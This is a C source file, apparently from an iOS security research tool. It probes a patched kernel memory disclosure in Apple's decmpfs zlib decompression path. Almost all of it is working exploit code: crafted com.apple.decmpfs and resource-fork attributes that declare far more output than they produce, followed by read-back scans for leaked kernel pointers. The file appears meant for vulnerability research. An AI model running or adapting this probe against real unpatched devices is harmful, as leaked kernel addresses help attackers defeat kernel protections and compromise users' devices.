// decmpfs / AppleFSCompressionTypeZlib staged probe -- CVE-2026-113910 class.
//
// iOS 27.2 fixed "Compression: an app may be able to disclose kernel memory --
// a memory initialization issue addressed with improved memory handling"
// (CVE-2026-113910). The only kext changed between 24A446 and 24B119 that matches
// that component is com.apple.AppleFSCompression.AppleFSCompressionTypeZlib,
// whose ChunkCompression.cpp decoder grew from 0x4a0 to 0xba4 bytes. This probe
// measures, in stages, whether an unprivileged app can (a) install a decmpfs
// attribute, (b) have reads served through the decoder, and (c) observe
// uninitialised kernel bytes in the decoded output.
//
// Stages:
//   0  plain-file baseline
//   1  type 1 (inline raw) round trip      -> proves decmpfs is honoured at all
//   2  type 3 (inline zlib) short output   -> declared size >> produced size
//   3  type 4 (resource-fork chunked zlib)-> the chunked path that was rewritten
//   4  retry stage 3 with UF_COMPRESSED set via chflags
//
// Every stage reports its own errno / size / byte samples; a failure at stage 1
// says nothing about stage 2, and the log keeps them separate.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/xattr.h>
#include <sys/stat.h>

void log_from_c(const char* msg);

#define printf(...) do { \
    char _log_buf[2048]; \
    snprintf(_log_buf, sizeof(_log_buf), __VA_ARGS__); \
    log_from_c(_log_buf); \
    fputs(_log_buf, stdout); \
    fputc('\n', stdout); \
    fflush(stdout); \
} while (0)

typedef struct { uint8_t *d; size_t n, cap; } buf;

static void bneed(buf *b, size_t extra) {
    if (b->n + extra > b->cap) { b->cap = (b->n + extra) * 2 + 64; b->d = realloc(b->d, b->cap); }
}
static void bput(buf *b, uint8_t v) { bneed(b, 1); b->d[b->n++] = v; }
static void bcat(buf *b, const void *p, size_t n) { bneed(b, n); memcpy(b->d + b->n, p, n); b->n += n; }
static void brep(buf *b, uint8_t v, size_t n) { bneed(b, n); memset(b->d + b->n, v, n); b->n += n; }
static void bfree(buf *b) { free(b->d); b->d = NULL; b->n = b->cap = 0; }

static void le16(buf *b, uint16_t v) { bput(b, v & 0xff); bput(b, v >> 8); }
static void le32(buf *b, uint32_t v) {
    bput(b, (v >> 0) & 0xff); bput(b, (v >> 8) & 0xff);
    bput(b, (v >> 16) & 0xff); bput(b, (v >> 24) & 0xff);
}
static void le64(buf *b, uint64_t v) {
    for (int i = 0; i < 8; i++) bput(b, (uint8_t)((v >> (8 * i)) & 0xff));
}
static void be32(buf *b, uint32_t v) {
    bput(b, (v >> 24) & 0xff); bput(b, (v >> 16) & 0xff);
    bput(b, (v >> 8) & 0xff); bput(b, v & 0xff);
}

static uint32_t adler32_of(const uint8_t *p, size_t n) {
    uint32_t a = 1, b = 0;
    for (size_t i = 0; i < n; i++) { a = (a + p[i]) % 65521; b = (b + a) % 65521; }
    return (b << 16) | a;
}

// 16-byte decmpfs header: 'cmpf', type, uncompressed size.
static void cmpf_header(buf *b, uint32_t type, uint64_t usize) {
    bcat(b, "cmpf", 4);
    le32(b, type);
    le64(b, usize);
}

// A minimal valid zlib stream producing exactly payload_len bytes.
// One final stored deflate block (BTYPE=00) plus a correct adler32.
static buf zlib_stored(const uint8_t *payload, size_t payload_len) {
    buf z = {0};
    bput(&z, 0x78); bput(&z, 0x01);                 // zlib header, no dictionary
    if (payload_len == 0) {
        bcat(&z, "\x01\x00\x00\xFF\xFF", 5);        // empty final stored block
    } else {
        bput(&z, 0x01);                             // BFINAL=1, BTYPE=00
        le16(&z, (uint16_t)payload_len);
        le16(&z, (uint16_t)~(uint16_t)payload_len);
        bcat(&z, payload, payload_len);
    }
    be32(&z, adler32_of(payload, payload_len));
    return z;
}

// arm64e iOS kernel addresses live in 0xfffffe00_00000000..0xfffffe0f_ffffffff.
static int is_kptr_candidate(uint64_t v) {
    return v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFF0000000000ULL;
}

static void report_read(const char *tag, const uint8_t *d, size_t n, size_t prefix) {
    size_t nonzero_after = 0, khits = 0;
    for (size_t i = prefix; i < n; i++) if (d[i] != 0) nonzero_after++;
    for (size_t i = 0; i + 8 <= n; i += 8) {
        uint64_t v = 0;
        for (int k = 0; k < 8; k++) v |= (uint64_t)d[i + k] << (8 * k);
        if (is_kptr_candidate(v)) {
            khits++;
            if (khits <= 8) printf("    %s: kptr candidate 0x%016llx @ +0x%zx",
                                   tag, (unsigned long long)v, i);
        }
    }
    printf("    %s: read=%zu nonzero_after_%zu=%zu kptr_candidates=%zu",
           tag, n, prefix, nonzero_after, khits);
    if (n > prefix) {
        size_t show = n - prefix; if (show > 48) show = 48;
        printf("    %s tail:", tag);
        for (size_t i = 0; i < show; i++) printf("%02x", d[prefix + i]);
        printf("\n");
    }
}

static int write_plain(const char *path, size_t n, uint8_t fill) {
    unlink(path);
    int fd = open(path, O_WRONLY | O_CREAT, 0644);
    if (fd < 0) return -1;
    uint8_t chunk[4096]; memset(chunk, fill, sizeof chunk);
    size_t left = n;
    while (left) {
        size_t t = left < sizeof chunk ? left : sizeof chunk;
        if (write(fd, chunk, t) != (ssize_t)t) break;
        left -= t;
    }
    close(fd);
    return 0;
}

static size_t read_all(const char *path, buf *out) {
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    uint8_t chunk[65536]; size_t got;
    while ((got = fread(chunk, 1, sizeof chunk, f)) > 0) bcat(out, chunk, got);
    fclose(f);
    return out->n;
}

static int set_xattr_errno(const char *path, const char *name, const buf *v) {
    if (setxattr(path, name, v->d, v->n, 0, 0) == 0) return 0;
    int e = errno;
    printf("    setxattr(%s) failed errno=%d (%s)", name, e, strerror(e));
    return e;
}

static void show_stat(const char *path, const char *when) {
    struct stat st;
    if (stat(path, &st) != 0) { printf("    stat(%s) failed errno=%d", when, errno); return; }
    printf("    stat %s: size=%lld mode=%o flags=0x%x\n", when,
           (long long)st.st_size, st.st_mode & 07777, (unsigned)st.st_flags);
}

void run_decmpfs_leak(const char *base_dir) {
    char path[512];
    snprintf(path, sizeof path, "%s/decmpfs_probe.bin", base_dir);

    printf("=== AGXProbe decmpfs staged probe (AppleFSCompressionTypeZlib / CVE-2026-113910) ===\n");

    // ---- stage 0: plain baseline -------------------------------------------------
    printf("[stage 0] plain file baseline\n");
    if (write_plain(path, 4096, 0x41) != 0) printf("    plain create failed errno=%d", errno);
    show_stat(path, "plain");
    buf base = {0}; size_t bn = read_all(path, &base);
    printf("    plain read=%zu\n", bn);
    bfree(&base);

    // ---- stage 1: type 1 inline raw ---------------------------------------------
        printf("[stage 1] type 1 inline raw round trip\n");
        {
            // A real compressed file has an EMPTY data fork; the kernel only routes
            // reads through decmpfs in that case. Create it empty here.
            unlink(path);
            int fd = open(path, O_WRONLY | O_CREAT, 0644); if (fd >= 0) close(fd);
            buf a = {0};
        cmpf_header(&a, 1, 16);
        bcat(&a, "ABCDEFGHIJKLMNOP", 16);
        printf("    attr=%zu bytes (<=3802: %s)\n", a.n, a.n <= 3802 ? "yes" : "no");
        int e = set_xattr_errno(path, "com.apple.decmpfs", &a);
        show_stat(path, "after xattr");
        buf r = {0}; size_t rn = e ? 0 : read_all(path, &r);
        int served = (rn >= 16 && memcmp(r.d, "ABCDEFGHIJKLMNOP", 16) == 0);
        printf("    type1: xattr_err=%d read=%zu served_from_decmpfs=%s\n",
               e, rn, served ? "YES" : "no");
        if (rn && !served) {
            printf("    type1 head:");
            for (size_t i = 0; i < (rn < 32 ? rn : 32); i++) printf("%02x", r.d[i]);
            printf("\n");
        }
        bfree(&r); bfree(&a);
    }

    // ---- stage 2: type 3 inline zlib, declared >> produced ----------------------
    printf("[stage 2] type 3 inline zlib short-output leak scan\n");
    {
        uint8_t payload[16]; memset(payload, 'Z', sizeof payload);
        buf z = zlib_stored(payload, sizeof payload);
        uint64_t decls[3] = { 0x1000, 0x10000, 0x100000 };
                for (int i = 0; i < 3; i++) {
                    unlink(path);
                    int fd = open(path, O_WRONLY | O_CREAT, 0644); if (fd >= 0) close(fd);
                    buf a = {0};
            cmpf_header(&a, 3, decls[i]);
            bcat(&a, z.d, z.n);
            int e = set_xattr_errno(path, "com.apple.decmpfs", &a);
            buf r = {0}; size_t rn = e ? 0 : read_all(path, &r);
            printf("    decl=0x%llx attr=%zu xattr_err=%d read=%zu\n",
                   (unsigned long long)decls[i], a.n, e, rn);
            if (rn) report_read("type3", r.d, rn, 16);
            bfree(&r); bfree(&a);
        }
        bfree(&z);
    }

    // ---- stage 3: type 4 chunked zlib via resource fork -------------------------
    printf("[stage 3] type 4 resource-fork chunked zlib\n");
    {
        enum { BLOCK = 65536 };
        uint8_t *raw = malloc(BLOCK);
        memset(raw, 'Q', BLOCK);
        buf z = zlib_stored(raw, 1024);          // produce 1024 of 65536 bytes
        size_t payload_at = 272;                 // 260 + 4 + index(8)
        size_t rel = payload_at - 260;           // index offsets are relative to 260
        buf fork = {0};
        brep(&fork, 0, payload_at);              // leading area + index slot
        le32(&fork, (uint32_t)rel);              // u32 position (relative to 260)
        le32(&fork, (uint32_t)z.n);             // u32 length
        bcat(&fork, z.d, z.n);
        printf("    fork=%zu chunk_z=%zu rel_off=%zu\n", fork.n, z.n, rel);
                unlink(path);
                int fd0 = open(path, O_WRONLY | O_CREAT, 0644); if (fd0 >= 0) close(fd0);
                int e0 = fd0 < 0 ? -1 : 0;
        int ef = set_xattr_errno(path, "com.apple.ResourceFork", &fork);
        buf a = {0}; cmpf_header(&a, 4, BLOCK);
        int ea = set_xattr_errno(path, "com.apple.decmpfs", &a);
        printf("    create_err=%d fork_err=%d attr_err=%d attr=%zu\n", e0, ef, ea, a.n);
        buf r = {0}; size_t rn = (ef || ea) ? 0 : read_all(path, &r);
        if (rn) report_read("type4", r.d, rn, 1024);
        else printf("    type4: read=0\n");
        bfree(&r); bfree(&a); bfree(&fork); bfree(&z); free(raw);
    }

    // ---- stage 4: retry stage 3 with UF_COMPRESSED ------------------------------
    printf("[stage 4] type 4 retry with UF_COMPRESSED\n");
    {
        extern int chflags(const char *, unsigned int);
                unlink(path);
                int fdc = open(path, O_WRONLY | O_CREAT, 0644); if (fdc >= 0) close(fdc);
                int fc = chflags(path, 0x20 /* UF_COMPRESSED */);
        printf("    chflags(UF_COMPRESSED) -> %d errno=%d\n", fc, errno);
        uint8_t *raw = malloc(65536); memset(raw, 'Q', 65536);
        buf z = zlib_stored(raw, 1024);
        buf fork = {0}; brep(&fork, 0, 272);
        le32(&fork, (uint32_t)(272 - 260)); le32(&fork, (uint32_t)z.n);
        bcat(&fork, z.d, z.n);
        buf a = {0}; cmpf_header(&a, 4, 65536);
        int ef = set_xattr_errno(path, "com.apple.ResourceFork", &fork);
        int ea = set_xattr_errno(path, "com.apple.decmpfs", &a);
        show_stat(path, "after xattrs");
        buf r = {0}; size_t rn = (ef || ea) ? 0 : read_all(path, &r);
        if (rn) report_read("type4c", r.d, rn, 1024);
        else printf("    type4c: read=0 fork_err=%d attr_err=%d\n", ef, ea);
        bfree(&r); bfree(&a); bfree(&fork); bfree(&z); free(raw);
    }

    unlink(path);
    printf("=== decmpfs probe done ===\n");
}
